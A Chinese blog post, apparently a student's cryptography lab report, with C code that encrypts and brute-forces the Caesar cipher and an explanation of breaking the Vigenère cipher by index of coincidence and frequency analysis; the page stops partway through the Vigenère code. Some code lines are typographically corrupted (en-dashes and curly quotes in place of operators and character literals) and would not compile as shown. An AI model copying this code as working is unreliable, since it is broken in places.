<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    hostname: new URL('https://KKotori.github.io').hostname,
    root: '/',
    scheme: 'Muse',
    version: '7.7.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
  };
</script>

  <meta property="og:type" content="website">
<meta property="og:title" content="WS">
<meta property="og:url" content="https://kkotori.github.io/index.html">
<meta property="og:site_name" content="WS">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="K_Kotori">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://kkotori.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>WS</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">WS</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/20/pws/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/20/pws/" class="post-title-link" itemprop="url">密码学实验</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-20 15:36:40 / 修改时间：22:34:58" itemprop="dateCreated datePublished" datetime="2020-02-20T15:36:40+08:00">2020-02-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
    {font-family:"MS Mincho";
    panose-1:2 2 6 9 4 2 5 8 3 4;}
@font-face
    {font-family:宋体;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:黑体;
    panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
    {font-family:"Cambria Math";
    panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
    {font-family:等线;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"等线 Light";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:华文中宋;
    panose-1:2 1 6 0 4 1 1 1 1 1;}
@font-face
    {font-family:Tahoma;
    panose-1:2 11 6 4 3 5 4 4 2 4;}
@font-face
    {font-family:Cambria;
    panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
    {font-family:Consolas;
    panose-1:2 11 6 9 2 2 4 3 2 4;}
@font-face
    {font-family:"\@等线";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@华文中宋";}
@font-face
    {font-family:"\@黑体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@等线 Light";}
@font-face
    {font-family:"\@宋体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@MS Mincho";
    panose-1:2 2 6 9 4 2 5 8 3 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    font-size:10.5pt;
    font-family:等线;}
h1
    {mso-style-link:"标题 1 字符";
    margin-top:17.0pt;
    margin-right:0cm;
    margin-bottom:16.5pt;
    margin-left:0cm;
    text-align:justify;
    text-justify:inter-ideograph;
    line-height:240%;
    page-break-after:avoid;
    font-size:22.0pt;
    font-family:等线;
    font-weight:bold;}
h3
    {mso-style-link:"标题 3 字符";
    margin-top:13.0pt;
    margin-right:0cm;
    margin-bottom:13.0pt;
    margin-left:0cm;
    text-align:justify;
    text-justify:inter-ideograph;
    line-height:173%;
    page-break-after:avoid;
    font-size:16.0pt;
    font-family:等线;
    font-weight:bold;}
p.MsoToc1, li.MsoToc1, div.MsoToc1
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    font-size:10.5pt;
    font-family:等线;}
p.MsoToc2, li.MsoToc2, div.MsoToc2
    {margin-top:0cm;
    margin-right:0cm;
    margin-bottom:0cm;
    margin-left:21.0pt;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    font-size:10.5pt;
    font-family:等线;}
p.MsoToc3, li.MsoToc3, div.MsoToc3
    {margin-top:0cm;
    margin-right:0cm;
    margin-bottom:0cm;
    margin-left:42.0pt;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    font-size:10.5pt;
    font-family:等线;
    font-weight:bold;}
p.MsoHeader, li.MsoHeader, div.MsoHeader
    {mso-style-link:"页眉 字符";
    margin:0cm;
    margin-bottom:.0001pt;
    text-align:center;
    layout-grid-mode:char;
    border:none;
    padding:0cm;
    font-size:9.0pt;
    font-family:等线;}
p.MsoFooter, li.MsoFooter, div.MsoFooter
    {mso-style-link:"页脚 字符";
    margin:0cm;
    margin-bottom:.0001pt;
    layout-grid-mode:char;
    font-size:9.0pt;
    font-family:等线;}
a:link, span.MsoHyperlink
    {color:blue;
    text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
    {color:#954F72;
    text-decoration:underline;}
p
    {margin-right:0cm;
    margin-left:0cm;
    font-size:12.0pt;
    font-family:宋体;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    text-indent:21.0pt;
    font-size:10.5pt;
    font-family:等线;}
p.MsoTocHeading, li.MsoTocHeading, div.MsoTocHeading
    {margin-top:12.0pt;
    margin-right:0cm;
    margin-bottom:0cm;
    margin-left:0cm;
    margin-bottom:.0001pt;
    line-height:107%;
    page-break-after:avoid;
    font-size:16.0pt;
    font-family:"等线 Light";
    color:#2F5496;}
span.a
    {mso-style-name:"页眉 字符";
    mso-style-link:页眉;}
span.a0
    {mso-style-name:"页脚 字符";
    mso-style-link:页脚;}
span.1
    {mso-style-name:"标题 1 字符";
    mso-style-link:"标题 1";
    font-weight:bold;}
span.3
    {mso-style-name:"标题 3 字符";
    mso-style-link:"标题 3";
    font-weight:bold;}
.MsoChpDefault
    {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
    {size:595.3pt 841.9pt;
    margin:72.0pt 90.0pt 72.0pt 90.0pt;
    layout-grid:15.6pt;}
div.WordSection1
    {page:WordSection1;}
 /* List Definitions */
 ol
    {margin-bottom:0cm;}
ul
    {margin-bottom:0cm;}
-->
</style>

</head>

<body lang=ZH-CN link=blue vlink="#954F72" style='text-justify-trim:punctuation'>

<p>密码学的实验报告，密码学真的难，DES完全是只知道思路但是写不出代码，最后到github参考了别人的代码才勉强修改完成，哈希稍微好些，可以选择，选了SHA-256以后简单的做了一个不加盐的函数，但是仍旧不是自己完全写出来的成果，ORZ…<br>过程很辛苦，查了很多资料，看了很多别人的实现方法，还是记录一下。</p>
<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>古典密码</span></a></h1><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a><a name="_Toc534469237"><span style='font-size:16.0pt;font-family:黑体'>凯撒密码</span></a></h2><p><span style='color:black'>在<span lang=EN-US><a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E5%AD%A6" target="_blank" rel="noopener"><span lang=EN-US style='color:black;text-decoration:none'><span lang=EN-US>密码学</span></span></a></span>中，恺撒密码（英语：<span lang=EN-US>Caesar cipher</span>），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，</span><span lang=EN-US><a href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87" target="_blank" rel="noopener"><span lang=EN-US style='color:black;text-decoration:none'><span lang=EN-US>明文</span></span></a></span><span style='color:black'>中的所有字母都在</span><span lang=EN-US><a href="https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8" target="_blank" rel="noopener"><span lang=EN-US style='color:black;text-decoration:none'><span lang=EN-US>字母表</span></span></a></span><span style='color:black'>上向后（或向前）按照一个固定数目进行偏移后被替换成<span lang=EN-US><a href="https://baike.baidu.com/item/%E5%AF%86%E6%96%87" target="_blank" rel="noopener"><span lang=EN-US style='color:black;text-decoration:none'><span lang=EN-US>密文</span></span></a></span>。例如，当偏移量是<span lang=EN-US>3</span>的时候，所有的字母<span lang=EN-US>A</span>将被替换成<span lang=EN-US>D</span>，<span lang=EN-US>B</span>变成<span lang=EN-US>E</span>，以此类推。这个加密方法是以罗马共和时期</span><span lang=EN-US><a href="https://baike.baidu.com/item/%E6%81%BA%E6%92%92" target="_blank" rel="noopener"><span lang=EN-US style='color:black;text-decoration:none'><span lang=EN-US>恺撒</span></span></a></span><span style='color:black'>的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</span></p>
<h3 id="凯撒安全性分析"><a href="#凯撒安全性分析" class="headerlink" title="凯撒安全性分析"></a><span style='font-size:14.0pt;font-family:黑体'>凯撒安全性分析</span></h3><p>由于英文只有<span lang=EN-US>26</span>个字母，而且可以通过求余降幂，规模最大为<span lang=EN-US>26</span>。完全可以暴力攻击。</p>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a><span style='font-size:14.0pt'>加密</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> cry[<span class="number">1000010</span>];</span><br><span class="line"><span class="comment">//char enc[1000010];</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> t,k;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line">  <span class="keyword">while</span>(t–)&#123;</span><br><span class="line">     <span class="built_in">memset</span>(cry,<span class="string">'\0'</span>,<span class="keyword">sizeof</span>(cry));</span><br><span class="line">     <span class="comment">//memset(enc,'\0',sizeof(enc));</span></span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"%s"</span>,cry);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;k);</span><br><span class="line">     <span class="comment">//printf("%d",k);</span></span><br><span class="line">     <span class="comment">//for(i=0;cry[i]!='\0';i++);</span></span><br><span class="line">     k=k%<span class="number">26</span>;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;cry[i]!=<span class="string">'\0'</span>;i++)&#123;</span><br><span class="line">         <span class="keyword">if</span>(cry[i]&lt;<span class="string">'A'</span>||cry[i]&gt;<span class="string">'z'</span>||(cry[i]&gt;<span class="string">'Z'</span>&amp;&amp;cry[i]&lt;<span class="string">'a'</span>))&#123;</span><br><span class="line">            cry[i]=cry[i];</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">if</span>((cry[i]-k&gt;<span class="string">'Z'</span>&amp;&amp;(cry[i]&gt;=<span class="string">'A'</span>&amp;&amp;cry[i]&lt;=<span class="string">'Z'</span>))||(cry[i]-k&gt;<span class="string">'z'</span>&amp;&amp;(cry[i]&gt;=<span class="string">'a'</span>&amp;&amp;cry[i]&lt;=<span class="string">'z'</span>)))&#123;</span><br><span class="line">            cry[i]=<span class="keyword">char</span>(cry[i]+k<span class="number">-26</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">if</span>((cry[i]-k&lt;<span class="string">'A'</span>&amp;&amp;(cry[i]&gt;=<span class="string">'A'</span>&amp;&amp;cry[i]&lt;=<span class="string">'Z'</span>))||(cry[i]-k&lt;<span class="string">'a'</span>&amp;&amp;(cry[i]&gt;=<span class="string">'a'</span>&amp;&amp;cry[i]&lt;=<span class="string">'z'</span>)))&#123;</span><br><span class="line">            cry[i]=<span class="keyword">char</span>(cry[i]+<span class="number">26</span>-k);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">            cry[i]=<span class="keyword">char</span>(cry[i]-k);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,cry);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//cout&lt;&lt;cry;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a><span style='font-size:14.0pt'>破解</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">//unknow K7</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> cip[<span class="number">1000010</span>];</span><br><span class="line"><span class="keyword">char</span> tr[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(cip,<span class="string">'\0'</span>,<span class="keyword">sizeof</span>(cip));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,cip);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">25</span>;k&gt;=<span class="number">0</span>;k–)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"key=%d\n"</span>,<span class="number">26</span>-k);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;cip[i]!=<span class="string">'\0'</span>;i++)&#123;</span><br><span class="line">         if(cip[i]&lt;'A'||cip[i]&gt;'z'||(cip[i]&gt;'Z&amp;&amp;cip[i]&lt;'a'))&#123;'</span><br><span class="line">            tr[i]=cip[i];</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">if</span>((cip[i]-k&gt;<span class="string">'Z'</span>&amp;&amp;(cip[i]&gt;=<span class="string">'A'</span>&amp;&amp;cip[i]&lt;=<span class="string">'Z'</span>))||(cip[i]-k&gt;<span class="string">'z'</span>&amp;&amp;(cip[i]&gt;=<span class="string">'a'</span>&amp;&amp;cip[i]&lt;=<span class="string">'z'</span>)))&#123;</span><br><span class="line">            tr[i]=<span class="keyword">char</span>(cip[i]+k<span class="number">-26</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">if</span>((cip[i]-k&lt;<span class="string">'A'</span>&amp;&amp;(cip[i]&gt;=<span class="string">'A'</span>&amp;&amp;cip[i]&lt;=<span class="string">'Z'</span>))||(cip[i]-k&lt;<span class="string">'a'</span>&amp;&amp;(cip[i]&gt;=<span class="string">'a'</span>&amp;&amp;cip[i]&lt;=<span class="string">'z'</span>)))&#123;</span><br><span class="line">            tr[i]=<span class="keyword">char</span>(cip[i]+<span class="number">26</span>-k);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">            tr[i]=<span class="keyword">char</span>(cip[i]-k);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,tr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="程序运行截图"><a href="#程序运行截图" class="headerlink" title="程序运行截图"></a><span style='font-size:14.0pt;font-family:黑体'>程序运行截图</span></h3><p><span lang=EN-US><img src="/2020/02/20/pws/image001.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image002.jpg" class=""></span></p>
<span lang=EN-US style='font-size:12.0pt;font-family:等线'>

</span>

<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a><a name="_Toc534469238"><span style='font-size:16.0pt;font-family:黑体'>维吉尼亚密码</span></a></h2><p><span style='font-family:宋体;color:black'>维吉尼亚密码（又译维热纳尔密码）是使用一系列<span lang=EN-US><a href="https://baike.baidu.com/item/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">凯撒密码</a></span>组成密码字母表的加密算法，属于多表密码的一种简单形式。</span><br><span style='font-family:宋体;color:black'>维吉尼亚密码曾多次被发明。该方法最早记录在<span lang=EN-US><a href="https://baike.baidu.com/item/%E5%90%89%E5%A5%A5%E4%B8%87%C2%B7%E5%B7%B4%E8%92%82%E6%96%AF%E5%A1%94%C2%B7%E8%B4%9D%E6%8B%89%E7%B4%A2" target="_blank" rel="noopener">吉奥万·巴蒂斯塔·贝拉索</a></span>（<span lang=EN-US> Giovan Battista Bellaso</span>）于<span lang=EN-US>1553</span>年所著的书《吉奥万<span lang=EN-US>·</span>巴蒂斯塔<span lang=EN-US>·</span>贝拉索先生的密码》（<span lang=EN-US>意大利语</span>：<span lang=EN-US>La cifra del. Sig.Giovan Battista Bellaso</span>）中。然而，后来在<span lang=EN-US>19</span>世纪时被误传为是<span lang=EN-US>法国</span>外交官</span><span lang=EN-US><a href="https://baike.baidu.com/item/%E5%B8%83%E8%8E%B1%E6%96%AF%C2%B7%E5%BE%B7%C2%B7%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A" target="_blank" rel="noopener">布莱斯·德·维吉尼亚</a></span><span style='font-family:宋体;color:black'>（<span lang=EN-US>Blaise De Vigenère</span>）所创造，因此现在被称为<span lang=EN-US>“</span>维吉尼亚密码<span lang=EN-US>”</span>。</span></p>
<h3 id="仿射密码的安全性分析"><a href="#仿射密码的安全性分析" class="headerlink" title="仿射密码的安全性分析"></a><span style='font-size:14.0pt;font-family:黑体'>仿射密码的安全性分析</span></h3><p><span style='font-family:宋体;color:black'>弗里德曼试验由威廉<span lang=EN-US>·F·</span>弗里德曼（<span lang=EN-US>William F. Friedman</span>）于<span lang=EN-US>1920</span>年代发明。他使用了<span lang=EN-US><a href="https://baike.baidu.com/item/%E9%87%8D%E5%90%88%E6%8C%87%E6%95%B0" target="_blank" rel="noopener">重合指数</a></span>（<span lang=EN-US>index of coincidence</span>）来描述密文字母频率的不匀性，从而破译密码。</span></p>
<p><span lang=EN-US style='font-family:宋体;color:black'><img src="/2020/02/20/pws/image003.jpg" class=""></span></p>
<p><span style='font-family:宋体;color:black'>指目标语言中两个任意字母相同的概率（英文中为<span lang=EN-US>0.067</span>），</span></p>
<p><span lang=EN-US style='font-family:宋体;color:black'><img src="/2020/02/20/pws/image004.jpg" class=""></span></p>
<p><span style='font-family:宋体;color:black'>指字母表中这种情况出现的概率（英文中为<span lang=EN-US>1/26=0.0385</span>），从而密钥长度可以估计为：</span></p>
<p><span lang=EN-US style='font-family:宋体;color:black'><img src="/2020/02/20/pws/image005.jpg" class=""></span></p>
<p><span style='font-family:宋体;color:black'>其中，观察概率为</span></p>
<p><span lang=EN-US style='font-family:宋体;color:black'><img src="/2020/02/20/pws/image006.jpg" class=""></span></p>
<p><span style='font-family:宋体;color:black'>其中，<span lang=EN-US>c</span>是指字母表的长度（英文为<span lang=EN-US>26</span>），<span lang=EN-US>N</span>指文本的长度，<span lang=EN-US>n1</span>到<span lang=EN-US>n</span>是指密文的字母频率，为整数。</span><br><span style='font-family:宋体;color:black'>此方法只是一种估计，会随着文本长度的增加而更为精确。在实践中，会尝试接近此估计的多个密钥长度。一种更好的方法是将密文写成矩阵形式，其中列数与假定的密钥长度一致，将每一列的重合指数单独计算，并求得平均重合指数。对于所有可能的密钥长度，平均重合指数最高的最有可能是真正的密钥长度。这样的试验可以作为卡西斯基试验的补充。 </span></p>
<h3 id="频率分析"><a href="#频率分析" class="headerlink" title="频率分析"></a><span style='font-size:14.0pt;font-family:黑体'>频率分析</span></h3><p><span style='font-family:宋体;color:black'>一旦能够确定密钥的长度，密文就能重新写成多列，列数与密钥长度对应。这样每一列其实就是一个</span><span lang=EN-US>凯撒密码</span><span style='font-family:宋体;color:black'>，而此密码的密钥（偏移量）则对应于维吉尼亚密码密钥的相应字母。与破译凯撒密码类似的方法，就能将密文破译。</span><br><span style='font-family:宋体;color:black'>柯克霍夫方法作为卡西斯基试验的改进，由奥古斯特<span lang=EN-US>·</span>柯克霍夫（<span lang=EN-US>Auguste Kerckhoffs</span>）提出。它将每一列的字母频率与转换后的明文频率相对应而得出每一列的密钥字母。一旦密钥中每一个字母都能确定，就能很简单地破译密文，从而得到明文。如果维吉尼亚字母表表格本身是杂乱而非按通常字母表顺序的话，那柯克霍夫方法就会无效，但卡西斯基试验和重复指数对于决定密钥长度仍旧是有效的。</span></p>
<h3 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a><span style='font-size:14.0pt'>加密</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> k[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">char</span> cyp[<span class="number">1010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">         <span class="comment">//scanf("%s",&amp;k);</span></span><br><span class="line">         <span class="comment">//getline(cin,1010);</span></span><br><span class="line">         <span class="built_in">scanf</span>(<span class="string">"%s%[^\n]"</span>,&amp;k,&amp;cyp);</span><br><span class="line">         <span class="keyword">int</span> clen,klen;</span><br><span class="line">         <span class="comment">/**for(clen=0;cyp[clen]!=’\0’;clen++)&#123;</span></span><br><span class="line"><span class="comment">           if(cyp[clen]&gt;’Z’)&#123;</span></span><br><span class="line"><span class="comment">              cyp[clen]=char(cyp[clen]-(‘a’-‘A’));</span></span><br><span class="line"><span class="comment">           &#125;</span></span><br><span class="line"><span class="comment">         &#125;**/</span></span><br><span class="line">         <span class="keyword">for</span>(klen=<span class="number">0</span>;k[klen]!=’\<span class="number">0</span>’;klen++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(k[klen]&gt;’Z’)&#123;</span><br><span class="line">              k[klen]=<span class="keyword">char</span>(k[klen]-(‘a’-‘A’));</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//printf("%s",k);</span></span><br><span class="line">         <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;cyp[i]!=’\<span class="number">0</span>’;i++)&#123;</span><br><span class="line">           <span 